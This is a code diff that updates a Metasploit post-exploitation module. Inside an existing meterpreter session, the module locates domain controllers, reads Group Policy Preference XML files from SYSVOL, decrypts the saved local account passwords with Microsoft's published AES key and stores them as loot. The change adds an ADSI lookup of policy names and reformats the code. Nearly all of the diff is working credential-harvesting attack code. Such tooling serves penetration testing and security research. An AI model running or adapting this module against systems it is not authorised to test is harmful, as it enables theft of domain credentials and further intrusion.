@@ -1,57 +1,63 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/core/auxiliary/report'
-require 'rex/parser/group_policy_preferences'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::File
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
   include Msf::Post::Windows::NetAPI
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Group Policy Preference Saved Passwords',
-      'Description'   => %q{
-        This module enumerates the victim machine's domain controller and
-        connects to it via SMB. It then looks for Group Policy Preference XML
-        files containing local user accounts and passwords and decrypts them
-        using Microsofts public AES key.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Group Policy Preference Saved Passwords',
+        'Description' => %q{
+          This module enumerates the victim machine's domain controller and
+          connects to it via SMB. It then looks for Group Policy Preference XML
+          files containing local user accounts and passwords and decrypts them
+          using Microsofts public AES key.
 
-        Cached Group Policy files may be found on end-user devices if the group
-        policy object is deleted rather than unlinked.
+          Cached Group Policy files may be found on end-user devices if the group
+          policy object is deleted rather than unlinked.
 
-        Tested on WinXP SP3 Client and Win2k8 R2 DC.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>[
-        'Ben Campbell',
-        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
-        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
-        'theLightCosine',
-        'mubix' #domain/dc enumeration code
+          Tested on WinXP SP3 Client and Win2k8 R2 DC.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Ben Campbell',
+          'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
+          'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
+          'theLightCosine',
+          'mubix' # domain/dc enumeration code
         ],
-      'References'    =>
-        [
+        'References' => [
           ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
           ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
           ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx'],
           ['URL', 'https://labs.portcullis.co.uk/blog/are-you-considering-using-microsoft-group-policy-preferences-think-again/'],
           ['MSB', 'MS14-025']
         ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              extapi_adsi_domain_query
+            ]
+          }
+        }
+      )
+    )
 
     register_options([
       OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
       OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
-      OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
+      OptString.new('DOMAINS', [false, 'Enumerate list of space separated domains DOMAINS="dom1 dom2".'])
+    ])
   end
 
   def run
@@ -95,7 +101,7 @@ class Metasploit3 < Msf::Post
     if datastore['ALL'] and datastore['DOMAINS'].blank?
       print_status "Enumerating Domains on the Network..."
       domains = enum_domains
-      domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
+      domains.reject! { |n| n == "WORKGROUP" || n.to_s.empty? }
     end
 
     # Add user specified domains to list.
@@ -105,9 +111,9 @@ class Metasploit3 < Msf::Post
         return
       end
       user_domains = datastore['DOMAINS'].split(' ')
-      user_domains = user_domains.map {|x| x.upcase}
+      user_domains = user_domains.map { |x| x.upcase }
       print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
-      user_domains.each{|ud| domains << ud}
+      user_domains.each { |ud| domains << ud }
     end
 
     # If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
@@ -134,13 +140,14 @@ class Metasploit3 < Msf::Post
       end
 
       next if dcs.blank?
+
       dcs.uniq!
       tbase = []
       dcs.each do |dc|
         print_status "Searching for Policy Share on #{dc}..."
         tbase = get_basepaths("\\\\#{dc}\\SYSVOL")
-        #If we got a basepath from the DC we know that we can reach it
-        #All DCs on the same domain should be the same so we only need one
+        # If we got a basepath from the DC we know that we can reach it
+        # All DCs on the same domain should be the same so we only need one
         unless tbase.blank?
           print_good "Found Policy Share on #{dc}"
           basepaths << tbase
@@ -169,10 +176,9 @@ class Metasploit3 < Msf::Post
       tmpfile = gpp_xml_file(filepath)
       parse_xml(tmpfile) if tmpfile
     end
-
   end
 
-  def get_basepaths(base, cached=false)
+  def get_basepaths(base, cached = false)
     locals = []
     begin
       session.fs.dir.foreach(base) do |sub|
@@ -188,6 +194,7 @@ class Metasploit3 < Msf::Post
           begin
             session.fs.dir.foreach(tpath) do |sub2|
               next if sub2 =~ /^(\.|\.\.)$/
+
               locals << "#{tpath}\\#{sub2}\\"
             end
           rescue Rex::Post::Meterpreter::RequestError => e
@@ -211,21 +218,46 @@ class Metasploit3 < Msf::Post
     end
   end
 
+  def adsi_query(domain, adsi_filter, adsi_fields)
+    return "" unless session.core.use("extapi")
+
+    query_result = session.extapi.adsi.domain_query(domain, adsi_filter, 255, 255, adsi_fields)
+
+    if query_result[:results].empty?
+      return "" # adsi query failed
+    else
+      return query_result[:results]
+    end
+  end
+
   def gpp_xml_file(path)
     begin
       data = read_file(path)
 
       spath = path.split('\\')
       retobj = {
-        :dc     => spath[2],
-        :path   => path,
-        :xml    => data
+        :dc => spath[2],
+        :guid => spath[6],
+        :path => path,
+        :xml => data
       }
       if spath[4] == "sysvol"
         retobj[:domain] = spath[5]
       else
         retobj[:domain] = spath[4]
       end
+
+      adsi_filter_gpo = "(&(objectCategory=groupPolicyContainer)(name=#{retobj[:guid]}))"
+      adsi_field_gpo = ['displayname', 'name']
+
+      gpo_adsi = adsi_query(retobj[:domain], adsi_filter_gpo, adsi_field_gpo)
+
+      unless gpo_adsi.empty?
+        gpo_name = gpo_adsi[0][0][:value]
+        gpo_guid = gpo_adsi[0][1][:value]
+        retobj[:name] = gpo_name if retobj[:guid] == gpo_guid
+      end
+
       return retobj
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "Received error code #{e.code} when reading #{path}"
@@ -236,19 +268,20 @@ class Metasploit3 < Msf::Post
   def parse_xml(xmlfile)
     mxml = xmlfile[:xml]
     print_status "Parsing file: #{xmlfile[:path]} ..."
-    filetype = File.basename(xmlfile[:path].gsub("\\","/"))
+    filetype = File.basename(xmlfile[:path].gsub("\\", "/"))
     results = Rex::Parser::GPP.parse(mxml)
 
     tables = Rex::Parser::GPP.create_tables(results, filetype, xmlfile[:domain], xmlfile[:dc])
 
     tables.each do |table|
-      print_good table.to_s
+      table << ['NAME', xmlfile[:name]] if xmlfile.member?(:name)
+      print_good " #{table.to_s}\n\n"
     end
 
     results.each do |result|
       if datastore['STORE']
-        stored_path = store_loot('windows.gpp.xml', 'text/plain', session, xmlfile[:xml], filetype, xmlfile[:path])
-        print_status("XML file saved to: #{stored_path}")
+        stored_path = store_loot('microsoft.windows.gpp', 'text/xml', session, xmlfile[:xml], filetype, xmlfile[:path])
+        print_good("XML file saved to: #{stored_path}")
         print_line
       end
 
